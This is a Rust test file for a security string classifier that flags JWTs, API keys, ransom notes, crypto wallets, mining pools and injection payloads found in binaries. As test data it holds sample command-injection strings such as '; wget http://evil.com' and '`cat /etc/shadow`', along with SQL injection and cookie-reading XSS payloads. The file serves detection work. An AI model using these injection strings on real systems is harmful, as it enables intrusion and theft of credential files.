#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
/// Comprehensive tests for security-focused string classification
/// Covers patterns in go/classifier.rs that detect malware indicators
/// Tests JWT, API keys, ransom notes, injection attacks, crypto, and gopclntab classification
use stng::{classify_string, StringKind};

/// Test JWT (JSON Web Token) detection
#[test]
fn test_jwt_detection() {
    // Valid JWT structure: header.payload.signature (3 base64 parts separated by dots)
    let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
    assert_eq!(classify_string(jwt), Some(StringKind::JWT));

    // Another valid JWT
    let jwt2 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuYXV0aDAuY29tLyIsInN1YiI6ImF1dGgwfDEyMzQ1Njc4OTAiLCJhdWQiOiJodHRwczovL2FwaS5leGFtcGxlLmNvbS8iLCJleHAiOjE2NDE2NzgwMDB9.abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    assert_eq!(classify_string(jwt2), Some(StringKind::JWT));
}

/// Test JWT rejection for non-JWT base64
#[test]
fn test_jwt_rejection() {
    // Not enough parts (only 2 dots)
    assert_ne!(classify_string("aaa.bbb"), Some(StringKind::JWT));

    // Too many parts
    assert_ne!(classify_string("a.b.c.d"), Some(StringKind::JWT));

    // Parts too short
    assert_ne!(classify_string("a.b.c"), Some(StringKind::JWT));

    // Not base64-like
    assert_ne!(classify_string("hello.world.test"), Some(StringKind::JWT));
}

/// Test API key detection (AWS, GitHub, Stripe, etc.)
#[test]
fn test_api_key_detection() {
    // AWS access keys (starts with AKIA, 20+ chars, >90% alphanumeric)
    assert_eq!(
        classify_string("AKIAIOSFODNN7EXAMPLE"),
        Some(StringKind::APIKey)
    );
    assert_eq!(
        classify_string("AKIATESTKEYEXAMPLE12"),
        Some(StringKind::APIKey)
    );

    // GitHub personal access tokens (ghp_ prefix, 36+ chars, >90% alphanumeric or _)
    assert_eq!(
        classify_string("ghp_1234567890abcdefghijklmnopqrstuvwxyzAB"),
        Some(StringKind::APIKey)
    );
    assert_eq!(
        classify_string("ghp_examplekeywithlongenoughstring12345678"),
        Some(StringKind::APIKey)
    );

    // Stripe keys (sk_live_ or pk_live_, 20+ chars, >90% alphanumeric or _)
    assert_eq!(
        classify_string("sk_live_1234567890abcdefghijklmnop"),
        Some(StringKind::APIKey)
    );
    assert_eq!(
        classify_string("pk_live_abcdefghijklmnopqrstuvwx"),
        Some(StringKind::APIKey)
    );

    // Slack tokens (starts with xox, 30+ chars, >90% alphanumeric or -)
    assert_eq!(
        classify_string("xoxb-1234567890-abcdefghijklmn"),
        Some(StringKind::APIKey)
    ); // 30 chars
    assert_eq!(
        classify_string("xoxp-12345678901234567890123456"),
        Some(StringKind::APIKey)
    ); // 32 chars
}

/// Test API key rejection for similar patterns
#[test]
fn test_api_key_rejection() {
    // AKIA but too short (needs 20+ chars)
    assert_ne!(classify_string("AKIA12345"), Some(StringKind::APIKey));

    // ghp_ but too short (needs 36+ chars)
    assert_ne!(classify_string("ghp_short"), Some(StringKind::APIKey));

    // sk_live_ but too short (needs 20+ chars)
    assert_ne!(classify_string("sk_live_short"), Some(StringKind::APIKey));

    // xox but too short (needs 30+ chars)
    assert_ne!(classify_string("xoxb-1234"), Some(StringKind::APIKey));

    // sk_test_ is not detected (only sk_live_ and pk_live_)
    assert_ne!(
        classify_string("sk_test_abcdefghijklmnopqrstuvwx"),
        Some(StringKind::APIKey)
    );
}

/// Test ransom note detection
#[test]
fn test_ransom_note_detection() {
    // Common ransom note patterns (requires ENCRYPTED/DECRYPT/RANSOM + >50% uppercase)
    assert_eq!(
        classify_string("YOUR FILES HAVE BEEN ENCRYPTED"),
        Some(StringKind::RansomNote)
    );
    assert_eq!(
        classify_string("ALL FILES ENCRYPTED PAY RANSOM"),
        Some(StringKind::RansomNote)
    );
    assert_eq!(
        classify_string("DECRYPT YOUR FILES NOW"),
        Some(StringKind::RansomNote)
    );

    // Ransomware file extensions (exact matches)
    assert_eq!(classify_string(".locked"), Some(StringKind::RansomNote));
    assert_eq!(classify_string(".encrypted"), Some(StringKind::RansomNote));
    assert_eq!(classify_string(".crypted"), Some(StringKind::RansomNote));
    assert_eq!(classify_string(".wannacry"), Some(StringKind::RansomNote));
    assert_eq!(classify_string(".ryuk"), Some(StringKind::RansomNote));
    assert_eq!(classify_string(".locky"), Some(StringKind::RansomNote));

    // Ransomware readme files (specific patterns)
    assert_eq!(
        classify_string("README-DECRYPT-INSTRUCTIONS.txt"),
        Some(StringKind::RansomNote)
    );
    assert_eq!(
        classify_string("HOW-TO-DECRYPT.html"),
        Some(StringKind::RansomNote)
    );
}

/// Test ransom note rejection for normal text
#[test]
fn test_ransom_note_rejection() {
    // Should not trigger on normal file encryption mentions
    assert_ne!(
        classify_string("encryption enabled"),
        Some(StringKind::RansomNote)
    );
    assert_ne!(
        classify_string("decrypt password"),
        Some(StringKind::RansomNote)
    );

    // Partial matches shouldn't trigger
    assert_ne!(classify_string("bitcoin"), Some(StringKind::RansomNote));
    assert_ne!(classify_string("encrypted"), Some(StringKind::RansomNote));
}

/// Test SQL injection payload detection
#[test]
fn test_sql_injection_detection() {
    // Classic SQL injection patterns (requires ' OR ' or 1'='1 patterns)
    assert_eq!(
        classify_string("' OR '1'='1"),
        Some(StringKind::SQLInjection)
    );
    assert_eq!(
        classify_string("' OR 'x'='x"),
        Some(StringKind::SQLInjection)
    );

    // admin'-- pattern
    assert_eq!(classify_string("admin'--"), Some(StringKind::SQLInjection));

    // UNION-based injections (requires UNION + SELECT)
    assert_eq!(
        classify_string("' UNION SELECT NULL--"),
        Some(StringKind::SQLInjection)
    );
    assert_eq!(
        classify_string("1 UNION ALL SELECT user"),
        Some(StringKind::SQLInjection)
    );
}

/// Test SQL injection rejection for normal SQL
#[test]
fn test_sql_injection_rejection() {
    // Normal SQL queries shouldn't trigger
    assert_ne!(
        classify_string("SELECT * FROM users"),
        Some(StringKind::SQLInjection)
    );
    assert_ne!(
        classify_string("WHERE id = 1"),
        Some(StringKind::SQLInjection)
    );

    // Single quotes alone shouldn't trigger
    assert_ne!(classify_string("it's"), Some(StringKind::SQLInjection));
    assert_ne!(classify_string("don't"), Some(StringKind::SQLInjection));
}

/// Test XSS (Cross-Site Scripting) payload detection
#[test]
fn test_xss_payload_detection() {
    // Script tag injections (requires both <script> and </script>)
    assert_eq!(
        classify_string("<script>alert('XSS')</script>"),
        Some(StringKind::XSSPayload)
    );
    assert_eq!(
        classify_string("<script>alert(1)</script>"),
        Some(StringKind::XSSPayload)
    );

    // Event handler injections (requires onerror= and alert()
    assert_eq!(
        classify_string("<img src=x onerror=alert(1)>"),
        Some(StringKind::XSSPayload)
    );
    assert_eq!(
        classify_string("onerror=alert(document.cookie)"),
        Some(StringKind::XSSPayload)
    );

    // JavaScript protocol (starts with javascript:)
    assert_eq!(
        classify_string("javascript:alert('XSS')"),
        Some(StringKind::XSSPayload)
    );
    assert_eq!(
        classify_string("javascript:alert(document.domain)"),
        Some(StringKind::XSSPayload)
    );
}

/// Test XSS rejection for normal HTML/JS
#[test]
fn test_xss_rejection() {
    // Normal script tags with actual code
    assert_ne!(
        classify_string("<script src=\"app.js\"></script>"),
        Some(StringKind::XSSPayload)
    );

    // Normal JavaScript
    assert_ne!(
        classify_string("function test() { return 1; }"),
        Some(StringKind::XSSPayload)
    );

    // Normal HTML
    assert_ne!(
        classify_string("<div>Hello World</div>"),
        Some(StringKind::XSSPayload)
    );
}

/// Test command injection detection
#[test]
fn test_command_injection_detection() {
    // Shell command injection patterns (requires "; " + cat/wget/curl)
    assert_eq!(
        classify_string("; cat /etc/passwd"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(
        classify_string("; wget http://evil.com"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(
        classify_string("; curl http://bad.com"),
        Some(StringKind::CommandInjection)
    );

    // Pipe injections (requires "| " + whoami/id/uname)
    assert_eq!(
        classify_string("| whoami"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(classify_string("| id"), Some(StringKind::CommandInjection));
    assert_eq!(
        classify_string("| uname -a"),
        Some(StringKind::CommandInjection)
    );

    // Command substitution
    assert_eq!(
        classify_string("$(cat /etc/hosts)"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(
        classify_string("$(whoami)"),
        Some(StringKind::CommandInjection)
    );

    // Backtick command substitution (requires backticks + content)
    assert_eq!(
        classify_string("`cat /etc/shadow`"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(
        classify_string("`ls -la`"),
        Some(StringKind::CommandInjection)
    );
    assert_eq!(classify_string("`pwd`"), Some(StringKind::CommandInjection));
    assert_eq!(
        classify_string("`echo test`"),
        Some(StringKind::CommandInjection)
    );
}

/// Test command injection rejection for normal commands
#[test]
fn test_command_injection_rejection() {
    // Normal file paths shouldn't trigger
    assert_ne!(
        classify_string("/etc/config"),
        Some(StringKind::CommandInjection)
    );
    assert_ne!(
        classify_string("/usr/bin/app"),
        Some(StringKind::CommandInjection)
    );

    // Normal shell commands without injection patterns
    assert_ne!(
        classify_string("echo hello"),
        Some(StringKind::CommandInjection)
    );
    assert_ne!(
        classify_string("ls -la"),
        Some(StringKind::CommandInjection)
    );
}

/// Test cryptocurrency mining pool detection
#[test]
fn test_mining_pool_detection() {
    // Stratum URLs (requires stratum+tcp:// or stratum+ssl://)
    assert_eq!(
        classify_string("stratum+tcp://pool.example.com:3333"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("stratum+ssl://pool.monero.com:443"),
        Some(StringKind::MiningPool)
    );

    // Known pool keywords (requires pool./nanopool/minergate + .com/.org/: )
    assert_eq!(
        classify_string("pool.supportxmr.com"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("pool.minexmr.org"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("nanopool.org:9999"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("minergate.com:3333"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("pool.example.com"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("pool.test.org:8080"),
        Some(StringKind::MiningPool)
    );
}

/// Test mining pool rejection for normal URLs
#[test]
fn test_mining_pool_rejection() {
    // Normal URLs shouldn't trigger
    assert_ne!(
        classify_string("https://example.com"),
        Some(StringKind::MiningPool)
    );
    assert_ne!(
        classify_string("tcp://server.com:8080"),
        Some(StringKind::MiningPool)
    );

    // "pool" in other contexts
    assert_ne!(
        classify_string("/var/pool/data"),
        Some(StringKind::MiningPool)
    );
}

/// Test GUID detection
#[test]
fn test_guid_detection() {
    // Standard GUID format
    assert_eq!(
        classify_string("{12345678-1234-1234-1234-123456789ABC}"),
        Some(StringKind::GUID)
    );
    assert_eq!(
        classify_string("{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}"),
        Some(StringKind::GUID)
    );
    assert_eq!(
        classify_string("{00000000-0000-0000-0000-000000000000}"),
        Some(StringKind::GUID)
    );

    // Mixed case
    assert_eq!(
        classify_string("{AbCdEfGh-1234-5678-90ab-cdef12345678}"),
        Some(StringKind::GUID)
    );
}

/// Test GUID rejection for similar patterns
#[test]
fn test_guid_rejection() {
    // Wrong number of dashes
    assert_ne!(
        classify_string("{12345678-1234-1234-123456789ABC}"),
        Some(StringKind::GUID)
    );

    // Wrong length
    assert_ne!(classify_string("{123-456-789}"), Some(StringKind::GUID));

    // Bare canonical UUIDs (no braces) are also recognized — used by
    // Mythic agent payload_uuid, RFC 4122 IDs, systemd, etc.
    assert_eq!(
        classify_string("12345678-1234-1234-1234-123456789ABC"),
        Some(StringKind::GUID)
    );

    // Not hex characters
    assert_ne!(
        classify_string("{GGGGGGGG-1234-1234-1234-123456789ABC}"),
        Some(StringKind::GUID)
    );
    assert_ne!(
        classify_string("GGGGGGGG-1234-1234-1234-123456789ABC"),
        Some(StringKind::GUID)
    );
}

/// Test CTF flag detection
#[test]
fn test_ctf_flag_detection() {
    // Standard CTF formats
    assert_eq!(
        classify_string("CTF{this_is_a_flag_12345}"),
        Some(StringKind::CTFFlag)
    );
    assert_eq!(
        classify_string("flag{test_flag_here}"),
        Some(StringKind::CTFFlag)
    );
    assert_eq!(
        classify_string("FLAG{UPPERCASE_FLAG}"),
        Some(StringKind::CTFFlag)
    );

    // Competition-specific formats
    assert_eq!(
        classify_string("picoCTF{beginner_flag_2024}"),
        Some(StringKind::CTFFlag)
    );
    assert_eq!(
        classify_string("HTB{hack_the_box_flag}"),
        Some(StringKind::CTFFlag)
    );
}

/// Test CTF flag rejection
#[test]
fn test_ctf_flag_rejection() {
    // Missing closing brace
    assert_ne!(
        classify_string("CTF{incomplete_flag"),
        Some(StringKind::CTFFlag)
    );

    // Wrong prefix
    assert_ne!(
        classify_string("TEST{not_a_flag}"),
        Some(StringKind::CTFFlag)
    );

    // No braces
    assert_ne!(classify_string("CTF_no_braces"), Some(StringKind::CTFFlag));
}

/// Test email detection edge cases
#[test]
fn test_email_edge_cases() {
    // Valid emails
    assert_eq!(classify_string("user@example.com"), Some(StringKind::Email));
    assert_eq!(
        classify_string("test.user@domain.co.uk"),
        Some(StringKind::Email)
    );
    assert_eq!(
        classify_string("admin@localhost.localdomain"),
        Some(StringKind::Email)
    );

    // With numbers
    assert_eq!(
        classify_string("user123@example456.com"),
        Some(StringKind::Email)
    );

    // With underscores/dashes
    assert_eq!(
        classify_string("test_user@ex-ample.com"),
        Some(StringKind::Email)
    );
}

/// Test email rejection for invalid formats
#[test]
fn test_email_rejection() {
    // Multiple @ signs
    assert_ne!(
        classify_string("user@@example.com"),
        Some(StringKind::Email)
    );

    // No @ sign
    assert_ne!(classify_string("userexample.com"), Some(StringKind::Email));

    // No domain
    assert_ne!(classify_string("user@"), Some(StringKind::Email));

    // No local part
    assert_ne!(classify_string("@example.com"), Some(StringKind::Email));

    // Just email-like but not valid
    assert_ne!(classify_string("not.an.email"), Some(StringKind::Email));
}

/// Test cryptocurrency address edge cases
#[test]
fn test_crypto_address_edge_cases() {
    // Bitcoin addresses (starts with 1, 3, or bc1)
    assert_eq!(
        classify_string("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
        Some(StringKind::CryptoWallet)
    );
    assert_eq!(
        classify_string("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"),
        Some(StringKind::CryptoWallet)
    );
    assert_eq!(
        classify_string("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
        Some(StringKind::CryptoWallet)
    );

    // Ethereum addresses (0x followed by 40 hex chars)
    assert_eq!(
        classify_string("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0"),
        Some(StringKind::CryptoWallet)
    );
    assert_eq!(
        classify_string("0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe"),
        Some(StringKind::CryptoWallet)
    );

    // Monero addresses (long, starts with 4)
    assert_eq!(classify_string("4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"), Some(StringKind::CryptoWallet));
}

/// Test crypto address rejection for similar patterns
#[test]
fn test_crypto_rejection() {
    // Too short for Bitcoin
    assert_ne!(
        classify_string("1A1zP1eP5Q"),
        Some(StringKind::CryptoWallet)
    );

    // Ethereum but wrong length
    assert_ne!(
        classify_string("0x742d35Cc"),
        Some(StringKind::CryptoWallet)
    );

    // Random hex that's not an address
    assert_ne!(
        classify_string("0xdeadbeef"),
        Some(StringKind::CryptoWallet)
    );
}

/// Test environment variable detection
#[test]
fn test_env_var_comprehensive() {
    // Standard env vars
    assert_eq!(classify_string("PATH"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("HOME"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("USER"), Some(StringKind::EnvVar));

    // With underscores
    assert_eq!(classify_string("MY_VAR"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("CUSTOM_PATH"), Some(StringKind::EnvVar));

    // Go-specific
    assert_eq!(classify_string("GOPATH"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GOROOT"), Some(StringKind::EnvVar));
}

/// Test environment variable rejection
#[test]
fn test_env_var_rejection() {
    // Too short without underscore
    assert_ne!(classify_string("AB"), Some(StringKind::EnvVar));

    // Lowercase (not typical for env vars in detection)
    assert_ne!(classify_string("path"), Some(StringKind::EnvVar));

    // Common words that aren't env vars
    assert_ne!(classify_string("THE"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("FOR"), Some(StringKind::EnvVar));
}

/// Test very long strings are skipped
#[test]
fn test_very_long_string_skip() {
    // Strings > 1000 chars should return None (skip expensive checks)
    let long_string = "A".repeat(1001);
    assert_eq!(classify_string(&long_string), None);
}

/// Test very short strings are skipped
#[test]
fn test_very_short_string_skip() {
    // Strings < 3 chars should return None
    assert_eq!(classify_string(""), None);
    assert_eq!(classify_string("a"), None);
    assert_eq!(classify_string("ab"), None);
}
